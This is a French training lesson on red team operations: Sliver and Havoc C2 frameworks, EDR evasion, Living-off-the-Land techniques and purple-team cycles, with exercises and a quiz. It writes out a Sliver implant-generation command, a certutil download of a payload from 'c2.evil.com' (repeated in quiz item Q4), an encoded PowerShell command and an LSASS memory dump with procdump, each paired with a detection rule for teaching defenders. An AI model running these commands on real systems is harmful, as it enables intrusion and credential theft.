# TOME P3 — Cloud Native, DevOps & Cyberdéfense — Jour 145 (6h) : Sécurité Offensive Avancée & Red Team Operations (C2 Frameworks Sliver/Havoc, Adversary Simulation & Purple Teaming)

> [!NOTE]
> **Objectif du jour :** Conduire des opérations de Red Team avancées et d'adversary simulation réalistes contre l'infrastructure bancaire de la BCC : frameworks de Command & Control modernes (Sliver C2, Havoc C2), techniques d'évasion des EDRs (Shellcode Injection, Process Injection, Living-off-the-land), et cycles Purple Team (Red + Blue collaboration).
>
> **Compétences visées :** `SEC-06` (A) — Red Team Operations & Adversary Simulation | `SEC-04` (A) — Purple Teaming & Defensive Validation

---

## 1) Module — Frameworks C2 Modernes (Sliver & Havoc) vs Détection EDR (2h)

### 📖 Narration/Intuition

Une opération Red Team authentique ne se limite pas à l'exécution d'un scan Nmap. Elle simule fidèlement les TTP d'un groupe APT réel : déploiement d'un implant (agent) sur un poste compromis, établissement d'un canal Command & Control (C2) chiffré vers un serveur contrôleur distant, déplacement latéral sur le réseau (Lateral Movement), exfiltration de données sensibles.

**Sliver C2** et **Havoc C2** sont les frameworks de Command & Control open-source les plus avancés utilisés par les équipes Red Team professionnelles pour remplacer les anciens outils détectés par tous les EDR modernes (Cobalt Strike signatur).

### 🔍 Anatomie Technique

**Génération d'un implant Sliver C2 pour une simulation Red Team autorisée :**

```bash
# Sliver C2 Server (Framework de Command & Control Red Team)
# AVERTISSEMENT : Ces commandes doivent exclusivement s'exécuter dans un environnement
# de Red Team autorisé avec contrat signé. Usage malveillant = infraction pénale.

# 1. Générer un implant HTTP/HTTPS avec profil de contournement EDR (Evasion Profile)
sliver > generate --http https://redteam.bcc-test.internal:443 \
                  --format exe \
                  --os windows \
                  --arch amd64 \
                  --name bcc_implant_win64 \
                  --evasion

# 2. Démarrer le listener HTTPS sur le serveur C2
sliver > https --lhost 0.0.0.0 --lport 443

# 3. Une fois l'implant exécuté sur la cible (poste simulé) - Session établie
sliver > sessions
[*] Active sessions:
ID: 1 | OS: Windows | User: KINSHASA\AdminBCC | PID: 4567 | Transport: HTTPS

# 4. Envoyer une commande à la session active
sliver (bcc_implant_win64) > shell whoami
> BCC\AdminBCC
```

---

## 2) Module — Techniques d'Évasion EDR & Living-off-the-Land (2h)

### 📖 Narration/Intuition

Les EDR modernes (CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint) détectent les malwares par analyse comportementale des processus, injection mémoire et appels système suspects.

Les Red Teams avancées utilisent des techniques **Living-off-the-Land (LoTL)** : utiliser uniquement des outils légitimes présents dans Windows (PowerShell, certutil, mshta, wmic) pour accomplir les phases d'attaque, rendant la détection extrêmement difficile.

### 🔍 Anatomie Technique

**Techniques LoTL les plus utilisées et règles Sigma de détection :**

```
TECHNIQUE 1 : LOLBin CertUtil pour télécharger un payload
  cmd> certutil.exe -urlcache -split -f http://c2.evil.com/payload.exe C:\tmp\payload.exe
  Détection : Sigma Rule — T1105 (Ingress Tool Transfer via certutil)

TECHNIQUE 2 : PowerShell Encoded Command pour contourner les logs
  ps> powershell -enc SGVsbG8gV29ybGQ=
  Détection : Sigma Rule — T1027.010 (Obfuscated Files via base64)

TECHNIQUE 3 : LSASS Memory Dump avec MiniDump
  ps> procdump.exe -ma lsass.exe lsass.dmp
  Détection : Sigma Rule — T1003.001 (LSASS Memory Dump)
```

---

## 3) Module — Cycle Purple Team & VECTR (2h)

### 📖 Narration/Intuition

Le **Purple Teaming** rompt la dichotomie traditionnelle Red Team (attaque) vs Blue Team (défense). Les deux équipes collaborent en temps réel : le Red Team exécute une technique d'attaque précise (ex: LSASS dump), le Blue Team vérifie immédiatement si son SIEM l'a détectée, et si non, écrit la règle de détection manquante.

**VECTR** est la plateforme de gestion collaborative Purple Team permettant de suivre et de documenter l'efficacité des détections pour chaque TTP MITRE testé.

### 🔍 Anatomie Technique

**Processus d'un exercice Purple Team :**

```
PHASE 1 — PLANIFICATION : Sélection des TTPs à tester (MITRE ATT&CK)
    ↓
PHASE 2 — RED TEAM EXECUTE : Exécution de la technique (ex: T1003 - LSASS)
    ↓
PHASE 3 — BLUE TEAM CHECK : Vérification SIEM — Alerte détectée ? (Oui/Non)
    ↓
PHASE 4 — REMÉDIATION : Écriture règle Sigma / Tuning EDR si non détecté
    ↓
PHASE 5 — DOCUMENTATION VECTR : Résultat (Détecté/Non détecté) dans le rapport
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **C2** | Command and Control — Infrastructure serveur de contrôle des implants Red Team |
| **LoTL** | Living-off-the-Land — Techniques utilisant uniquement des outils légitimes du système |
| **LOLBin** | Living-Off-the-Land Binary — Binaire légitime Windows/Linux détourné à des fins malveillantes |
| **VECTR** | Plateforme de gestion collaborative des exercices Purple Team |
| **Purple Team** | Collaboration synchronisée entre Red Team (attaque) et Blue Team (défense) |

---

## 🏋️ Exercices & Corrigés

**Exercice 1 :** Quelle est la différence fondamentale entre un exercice **Red Team classique** et un exercice **Purple Team** ?

**Corrigé :** Un exercice **Red Team classique** est mené en secret, souvent sans que l'équipe Blue Team sache qu'une simulation est en cours. L'objectif est de mesurer la capacité de détection réelle dans des conditions authentiques. L'exercice peut durer des semaines. Un exercice **Purple Team** est une collaboration ouverte et itérative en temps réel : les équipes Red et Blue travaillent ensemble, testant une technique à la fois, et comblant immédiatement les lacunes de détection. Le Purple Team est plus efficace pour améliorer rapidement la couverture de détection sur un large spectre de TTPs MITRE.

**Exercice 2 :** Pourquoi les attaques par techniques **Living-off-the-Land (LoTL)** sont-elles particulièrement difficiles à détecter pour les solutions EDR classiques basées sur les signatures ?

**Corrigé :** Les techniques **LoTL** n'introduisent aucun nouveau fichier malveillant dans le système : elles détournent des outils légitimes pré-installés (certutil, PowerShell, wmic, mshta). Les solutions EDR basées sur les signatures recherchent des patterns de fichiers malveillants connus (hash de malware). Puisqu'aucun fichier malveillant n'est introduit, la signature ne correspond à rien de connu. La détection de ces techniques requiert une analyse **comportementale** et une corrélation de la séquence d'événements système (ex: PowerShell contactant un IP externe inhabituel après un LSASS dump).

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quel framework C2 open-source moderne est utilisé par les équipes Red Team professionnelles pour déployer des implants évoluant vers les infrastructures cibles avec contournement des EDRs ?
- A) Sliver C2 (ou Havoc C2)
- B) MS Paint
- C) Disquette
- D) Notepad

**Réponse : A**

**Q2 :** Que désigne l'acronyme LoTL (Living-off-the-Land) en cybersécurité offensive ?
- A) L'utilisation exclusive d'outils légitimes présents sur le système cible pour accomplir les phases d'attaque sans introduire de malware
- B) Une technique d'agriculture
- C) Un protocole réseau
- D) Un système de fichiers

**Réponse : A**

**Q3 :** Quel type d'exercice cybersécurité réunit simultanément les équipes offensive et défensive pour tester et améliorer les capacités de détection en temps réel ?
- A) Purple Team
- B) Disquette
- C) Câble VGA
- D) Imprimante

**Réponse : A**

**Q4 :** Quelle commande malveillante LOLBin utilise un outil légitime Windows pour télécharger un payload depuis un serveur C2 ?
- A) `certutil.exe -urlcache -split -f http://c2.com/payload.exe`
- B) `format c:`
- C) `notepad.exe`
- D) `calc.exe`

**Réponse : A**

**Q5 :** Quelle plateforme de gestion permet de documenter et suivre les résultats (détecté / non détecté) de chaque TTP testé lors d'un exercice Purple Team ?
- A) VECTR
- B) Word
- C) Paint
- D) Calculator

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
